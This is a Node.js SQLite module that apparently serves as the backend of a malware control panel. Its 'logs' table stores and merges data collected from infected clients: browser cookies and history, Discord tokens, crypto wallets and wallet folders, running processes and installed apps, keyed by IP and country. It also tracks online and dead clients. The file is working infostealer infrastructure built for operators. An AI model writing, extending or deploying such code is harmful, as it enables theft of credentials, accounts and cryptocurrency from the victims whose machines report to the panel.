const Database = require('better-sqlite3');
const path = require('path');
const bcrypt = require('bcrypt');

const DB_PATH = path.join(__dirname, 'webpanel.db');

let db;
try {
    db = new Database(DB_PATH);
    console.log(`Database opened: ${DB_PATH}`);
} catch (error) {
    console.error('Failed to open database:', error);
    throw error;
}

// Enable foreign keys
try {
    db.pragma('foreign_keys = ON');
} catch (error) {
    console.error('Failed to enable foreign keys:', error);
}

// Initialize database schema
const initDatabase = () => {
    // Users table
    db.exec(`
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_login DATETIME,
            is_active INTEGER DEFAULT 1
        )
    `);

    // Login attempts table (for tracking login history)
    db.exec(`
        CREATE TABLE IF NOT EXISTS login_attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            ip_address TEXT,
            success INTEGER DEFAULT 0,
            attempted_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            user_agent TEXT
        )
    `);

    // Logs table (for client logs)
    db.exec(`
        CREATE TABLE IF NOT EXISTS logs (
            id TEXT PRIMARY KEY,
            session_id TEXT,
            ip TEXT,
            country TEXT,
            date DATETIME,
            data_summary TEXT,
            pc_data TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);
    
    // Create index for session_id for faster lookups
    db.exec(`
        CREATE INDEX IF NOT EXISTS idx_logs_session_id ON logs(session_id);
    `);
    
    // Migrate existing database: add session_id and updated_at columns if they don't exist
    // Check if columns exist using PRAGMA table_info (safer than SELECT)
    try {
        const columns = db.prepare("PRAGMA table_info(logs)").all();
        const columnNames = columns.map(col => col.name);
        const needsMigration = !columnNames.includes('session_id') || !columnNames.includes('updated_at');
        
        if (needsMigration) {
            console.log('Migrating database schema: adding session_id and updated_at columns...');
            try {
                if (!columnNames.includes('session_id')) {
                    db.exec('ALTER TABLE logs ADD COLUMN session_id TEXT');
                }
                if (!columnNames.includes('updated_at')) {
                    db.exec('ALTER TABLE logs ADD COLUMN updated_at DATETIME DEFAULT CURRENT_TIMESTAMP');
                }
                db.exec('CREATE INDEX IF NOT EXISTS idx_logs_session_id ON logs(session_id)');
                console.log('Database migration completed successfully');
            } catch (migrationError) {
                console.error('Database migration error:', migrationError.message);
            }
        }
    } catch (error) {
        console.error('Error checking database schema:', error.message);
    }

    // Create indexes for better performance
    db.exec(`
        CREATE INDEX IF NOT EXISTS idx_logs_date ON logs(date);
        CREATE INDEX IF NOT EXISTS idx_logs_ip ON logs(ip);
        CREATE INDEX IF NOT EXISTS idx_login_attempts_username ON login_attempts(username);
        CREATE INDEX IF NOT EXISTS idx_login_attempts_attempted_at ON login_attempts(attempted_at);
    `);

    // Initialize default admin user if no users exist (only from environment variables)
    const userCount = db.prepare('SELECT COUNT(*) as count FROM users').get();
    if (userCount.count === 0) {
        const defaultUsername = process.env.DEFAULT_ADMIN_USERNAME;
        const defaultPassword = process.env.DEFAULT_ADMIN_PASSWORD;
        
        if (!defaultUsername || !defaultPassword) {
            console.warn('⚠️  WARNING: No users exist and DEFAULT_ADMIN_USERNAME/DEFAULT_ADMIN_PASSWORD not set in .env');
            console.warn('   Please set these environment variables to create the initial admin user.');
            console.warn('   Or use the database management script: node manage-db.js create-user <username> <password>');
            return;
        }
        
        // Hash password with bcrypt (includes automatic salting)
        // bcrypt automatically generates a unique salt for each password
        const passwordHash = bcrypt.hashSync(defaultPassword, 10);
        
        db.prepare(`
            INSERT INTO users (username, password_hash)
            VALUES (?, ?)
        `).run(defaultUsername, passwordHash);
        
        console.log(`Default admin user created from environment variables. Username: ${defaultUsername}`);
        console.log('⚠️  IMPORTANT: Change the default password immediately after first login!');
    }

    console.log('Database initialized successfully');
};

// User operations
const userDb = {
    findByUsername: (username) => {
        return db.prepare('SELECT * FROM users WHERE username = ? AND is_active = 1').get(username);
    },
    
    create: (username, passwordHash) => {
        try {
            const result = db.prepare(`
                INSERT INTO users (username, password_hash)
                VALUES (?, ?)
            `).run(username, passwordHash);
            return { id: result.lastInsertRowid, username };
        } catch (error) {
            if (error.code === 'SQLITE_CONSTRAINT_UNIQUE') {
                throw new Error('Username already exists');
            }
            throw error;
        }
    },
    
    updatePassword: (username, passwordHash) => {
        const result = db.prepare(`
            UPDATE users 
            SET password_hash = ?
            WHERE username = ?
        `).run(passwordHash, username);
        return result.changes > 0;
    },
    
    updateLastLogin: (username) => {
        db.prepare(`
            UPDATE users 
            SET last_login = CURRENT_TIMESTAMP
            WHERE username = ?
        `).run(username);
    },
    
    getAll: () => {
        return db.prepare('SELECT id, username, created_at, last_login, is_active FROM users').all();
    }
};

// Login attempts operations
const loginAttemptsDb = {
    create: (username, ipAddress, success, userAgent) => {
        db.prepare(`
            INSERT INTO login_attempts (username, ip_address, success, user_agent)
            VALUES (?, ?, ?, ?)
        `).run(username, ipAddress, success ? 1 : 0, userAgent);
    },
    
    getRecentAttempts: (username, minutes = 15) => {
        return db.prepare(`
            SELECT * FROM login_attempts
            WHERE username = ? AND attempted_at > datetime('now', '-' || ? || ' minutes')
            ORDER BY attempted_at DESC
        `).all(username, minutes);
    },
    
    getAll: (limit = 100) => {
        return db.prepare(`
            SELECT * FROM login_attempts
            ORDER BY attempted_at DESC
            LIMIT ?
        `).all(limit);
    }
};

// Logs operations
const logsDb = {
    createOrUpdate: (logData) => {
        const { id, sessionId, ip, country, date, dataSummary, pcData } = logData;
        
        // Check if log exists by session_id
        let existingLog = null;
        if (sessionId) {
            existingLog = db.prepare('SELECT * FROM logs WHERE session_id = ?').get(sessionId);
        }
        
        if (existingLog) {
            // Merge with existing log
            const existingPcData = JSON.parse(existingLog.pc_data || '{}');
            const existingDataSummary = JSON.parse(existingLog.data_summary || '{}');
            
            // Merge pcData (keep existing values, update with new non-null/non-empty values)
            const mergedPcData = {
                ...existingPcData,
                // Override with new values if provided (non-null/non-empty)
                screenSize: pcData.screenSize || existingPcData.screenSize,
                dateTime: pcData.dateTime || existingPcData.dateTime,
                ipAddress: pcData.ipAddress || existingPcData.ipAddress,
                location: pcData.location || existingPcData.location,
                systemInfo: pcData.systemInfo || existingPcData.systemInfo,
                browserCookies: pcData.browserCookies || existingPcData.browserCookies,
                // For arrays/lists, use new data if it exists and is non-empty, otherwise keep existing
                runningProcesses: (pcData.runningProcesses && pcData.runningProcesses.length > 0) 
                    ? pcData.runningProcesses 
                    : (existingPcData.runningProcesses || []),
                installedApps: (pcData.installedApps && pcData.installedApps.length > 0) 
                    ? pcData.installedApps 
                    : (existingPcData.installedApps || []),
                browserHistory: pcData.browserHistory || existingPcData.browserHistory,
                discordTokens: pcData.discordTokens || existingPcData.discordTokens,
                cryptoWallets: pcData.cryptoWallets || existingPcData.cryptoWallets,
                cryptoWalletFolders: pcData.cryptoWalletFolders || existingPcData.cryptoWalletFolders
            };
            
            // Merge dataSummary
            const mergedDataSummary = {
                ...existingDataSummary,
                ...dataSummary
            };
            
            // Update the log
            db.prepare(`
                UPDATE logs 
                SET ip = ?, country = ?, date = ?, data_summary = ?, pc_data = ?, updated_at = CURRENT_TIMESTAMP
                WHERE session_id = ?
            `).run(
                ip || existingLog.ip,
                country || existingLog.country,
                date || existingLog.date,
                JSON.stringify(mergedDataSummary),
                JSON.stringify(mergedPcData),
                sessionId
            );
            
            return existingLog.id;
        } else {
            // Create new log
            db.prepare(`
                INSERT INTO logs (id, session_id, ip, country, date, data_summary, pc_data)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            `).run(
                id,
                sessionId,
                ip,
                country,
                date,
                JSON.stringify(dataSummary),
                JSON.stringify(pcData)
            );
            return id;
        }
    },
    
    create: (logData) => {
        // Legacy method for backward compatibility
        return this.createOrUpdate(logData);
    },
    
    getAll: () => {
        const logs = db.prepare('SELECT * FROM logs ORDER BY date DESC').all();
        return logs.map(log => ({
            id: log.id,
            ip: log.ip,
            country: log.country,
            date: log.date,
            dataSummary: JSON.parse(log.data_summary || '{}'),
            pcData: JSON.parse(log.pc_data || '{}')
        }));
    },
    
    getById: (logId) => {
        const log = db.prepare('SELECT * FROM logs WHERE id = ?').get(logId);
        if (!log) return null;
        return {
            id: log.id,
            ip: log.ip,
            country: log.country,
            date: log.date,
            dataSummary: JSON.parse(log.data_summary || '{}'),
            pcData: JSON.parse(log.pc_data || '{}')
        };
    },
    
    deleteByIds: (logIds) => {
        const placeholders = logIds.map(() => '?').join(',');
        const result = db.prepare(`DELETE FROM logs WHERE id IN (${placeholders})`).run(...logIds);
        return result.changes;
    },
    
    getStats: () => {
        const totalLogs = db.prepare('SELECT COUNT(*) as count FROM logs').get().count;
        
        const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000).toISOString();
        const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000).toISOString();
        
        const uniqueIps = db.prepare(`
            SELECT COUNT(DISTINCT ip) as count FROM logs
        `).get().count;
        
        const onlineClients = db.prepare(`
            SELECT COUNT(DISTINCT ip) as count 
            FROM logs 
            WHERE date > ?
        `).get(fiveMinutesAgo).count;
        
        const deadClients = db.prepare(`
            SELECT COUNT(DISTINCT ip) as count 
            FROM logs 
            WHERE date < ?
        `).get(oneHourAgo).count;
        
        return {
            totalLogs,
            allClients: uniqueIps,
            onlineClients,
            deadClients
        };
    }
};

// Initialize database on module load
try {
    initDatabase();
} catch (error) {
    console.error('Failed to initialize database:', error);
    console.error('Stack trace:', error.stack);
    process.exit(1);
}

module.exports = {
    db,
    userDb,
    loginAttemptsDb,
    logsDb
};

